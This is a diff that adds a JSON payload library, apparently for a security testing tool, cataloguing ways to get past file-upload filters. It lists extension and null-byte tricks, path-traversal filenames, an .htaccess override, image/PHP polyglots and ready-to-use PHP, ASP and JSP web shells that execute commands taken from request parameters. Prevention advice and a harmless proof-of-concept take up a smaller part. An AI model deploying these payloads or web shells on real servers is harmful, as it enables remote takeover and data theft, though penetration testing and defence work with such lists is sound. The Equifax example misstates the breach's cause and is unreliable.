@@ -1,0 +1,226 @@
+{
+  "description": "REVUEX File Upload Bypass Techniques",
+  "version": "2.0",
+  "techniques": {
+    "extension_bypass": {
+      "double_extension": {
+        "description": "File appears as one extension but executes as another",
+        "examples": [
+          "innocent.jpg.php",
+          "innocent.png.php5",
+          "innocent.gif.phtml",
+          "innocent.pdf.asp",
+          "innocent.txt.aspx"
+        ],
+        "notes": "Server may check first extension only"
+      },
+      "reverse_double": {
+        "description": "Extension ordering bypass",
+        "examples": [
+          "innocent.php.jpg",
+          "innocent.asp.png",
+          "innocent.jsp.gif"
+        ],
+        "notes": "Some servers execute based on first extension"
+      },
+      "null_byte": {
+        "description": "Null byte truncation",
+        "examples": [
+          "innocent.php%00.jpg",
+          "innocent.php\\x00.png",
+          "innocent.asp%00.gif",
+          "innocent.php\u0000.txt"
+        ],
+        "notes": "Null byte terminates string in some languages"
+      },
+      "case_variation": {
+        "description": "Case sensitivity bypass",
+        "examples": [
+          "innocent.PhP",
+          "innocent.pHp",
+          "innocent.PHP",
+          "innocent.Php5",
+          "innocent.AsP"
+        ],
+        "notes": "Filter may be case-sensitive"
+      },
+      "alternative_extensions": {
+        "description": "Less common executable extensions",
+        "php": ["php3", "php4", "php5", "php7", "pht", "phtml", "phps"],
+        "asp": ["asp", "aspx", "cer", "asa", "asax", "ashx", "asmx"],
+        "jsp": ["jsp", "jspx", "jsw", "jsv", "jspf"],
+        "perl": ["pl", "pm", "cgi", "lib"],
+        "coldfusion": ["cfm", "cfml", "cfc", "dbm"]
+      },
+      "trailing_characters": {
+        "description": "Characters after extension",
+        "examples": [
+          "innocent.php.",
+          "innocent.php ",
+          "innocent.php\n",
+          "innocent.php\r",
+          "innocent.php::$DATA"
+        ],
+        "notes": "Some systems strip trailing characters"
+      },
+      "unicode": {
+        "description": "Unicode character bypass",
+        "examples": [
+          "innocent.ph\u0070",
+          "innocent.p\u0068p",
+          "innocent.\u0070hp"
+        ],
+        "notes": "Unicode normalization issues"
+      },
+      "htaccess": {
+        "description": "Upload .htaccess to execute non-standard extensions",
+        "content": "AddType application/x-httpd-php .jpg\nAddType application/x-httpd-php .png",
+        "notes": "Allows arbitrary files to be executed as PHP"
+      }
+    },
+    "mime_bypass": {
+      "description": "MIME type validation bypass",
+      "techniques": [
+        {
+          "name": "Fake Content-Type",
+          "description": "Send image MIME for executable",
+          "example": "Content-Type: image/jpeg (for .php file)"
+        },
+        {
+          "name": "Magic Bytes",
+          "description": "Add valid image magic bytes + code",
+          "example": "GIF89a<?php phpinfo(); ?>"
+        }
+      ],
+      "magic_bytes": {
+        "gif": "GIF89a",
+        "png": "\\x89PNG\\r\\n\\x1a\\n",
+        "jpeg": "\\xff\\xd8\\xff",
+        "pdf": "%PDF-",
+        "zip": "PK\\x03\\x04"
+      }
+    },
+    "path_traversal": {
+      "description": "Write file to arbitrary location",
+      "examples": [
+        "../../../tmp/evil.php",
+        "..\\..\\..\\tmp\\evil.asp",
+        "....//....//tmp//evil.php",
+        "..%2f..%2f..%2ftmp%2fevil.php",
+        "..%5c..%5c..%5ctmp%5cevil.asp"
+      ],
+      "notes": "Allows writing outside upload directory"
+    },
+    "polyglot_files": {
+      "description": "Files valid as multiple formats",
+      "examples": [
+        {
+          "name": "GIF/PHP Polyglot",
+          "structure": "GIF89a\n<?php phpinfo(); ?>",
+          "extension": ".gif",
+          "notes": "Valid GIF header + PHP code"
+        },
+        {
+          "name": "PNG/PHP Polyglot",
+          "structure": "\\x89PNG\\r\\n\\x1a\\n\n<?php phpinfo(); ?>",
+          "extension": ".png",
+          "notes": "Valid PNG header + PHP code"
+        },
+        {
+          "name": "JPEG/PHP Polyglot",
+          "structure": "\\xff\\xd8\\xff<?php phpinfo(); ?>",
+          "extension": ".jpg",
+          "notes": "Valid JPEG header + PHP code"
+        }
+      ]
+    },
+    "content_type_confusion": {
+      "description": "Server interprets differently than intended",
+      "examples": [
+        "image/svg+xml with JavaScript",
+        "text/html with PHP code",
+        "application/x-php with image extension"
+      ]
+    },
+    "race_condition": {
+      "description": "Upload and access before validation completes",
+      "steps": [
+        "Upload malicious file",
+        "Immediately access uploaded file URL",
+        "Execute before security scan completes"
+      ]
+    },
+    "archive_extraction": {
+      "description": "Zip/tar with dangerous files or symlinks",
+      "techniques": [
+        "Zip slip (path traversal in zip)",
+        "Symlink to sensitive files",
+        "Archive bomb (compression bomb)"
+      ]
+    }
+  },
+  "dangerous_content": {
+    "php_webshell": [
+      "<?php system($_GET['cmd']); ?>",
+      "<?php eval($_POST['code']); ?>",
+      "<?php @eval($_REQUEST['cmd']); ?>",
+      "<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>"
+    ],
+    "asp_webshell": [
+      "<%eval request(\"cmd\")%>",
+      "<%execute(request(\"cmd\"))%>"
+    ],
+    "jsp_webshell": [
+      "<%@ page import=\"java.io.*\" %>\n<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
+    ]
+  },
+  "poc_files": {
+    "safe_test": {
+      "description": "Safe PoC that proves vulnerability without harm",
+      "php": "<?php\n// SECURITY TEST - SAFE PoC\n// Marker: [UNIQUE_ID]\necho \"File upload vulnerability detected\";\necho \"Test: [TEST_NAME]\";\n// This is a PoC only - no malicious code\n?>",
+      "asp": "<%\n' SECURITY TEST - SAFE PoC\nResponse.Write(\"File upload vulnerability detected\")\nResponse.Write(\"Test: [TEST_NAME]\")\n%>"
+    }
+  },
+  "prevention": {
+    "best_practices": [
+      "Whitelist allowed extensions (never blacklist)",
+      "Validate actual file content (magic bytes)",
+      "Rename uploaded files (random names)",
+      "Store uploads outside web root",
+      "Disable script execution in upload directory",
+      "Use Content-Disposition: attachment for downloads",
+      "Implement file type detection library",
+      "Strip/normalize filenames",
+      "Remove null bytes, dots, spaces",
+      "Convert to lowercase before validation",
+      "Scan files with antivirus",
+      "Set proper file permissions (non-executable)",
+      "Use separate domain for uploads (sandbox)",
+      "Implement rate limiting",
+      "Log all upload attempts"
+    ]
+  },
+  "real_world_examples": [
+    {
+      "company": "Equifax",
+      "year": 2017,
+      "impact": "$700M+ settlement",
+      "vulnerability": "Unrestricted file upload",
+      "result": "Web shell deployed, 147M records stolen"
+    },
+    {
+      "company": "Facebook",
+      "year": 2020,
+      "bounty": "$20,000",
+      "vulnerability": "Extension bypass",
+      "technique": "SVG with XSS"
+    },
+    {
+      "company": "E-commerce Platform",
+      "year": 2019,
+      "bounty": "$15,000",
+      "vulnerability": "Double extension bypass",
+      "result": "RCE via PHP upload"
+    }
+  ]
+}
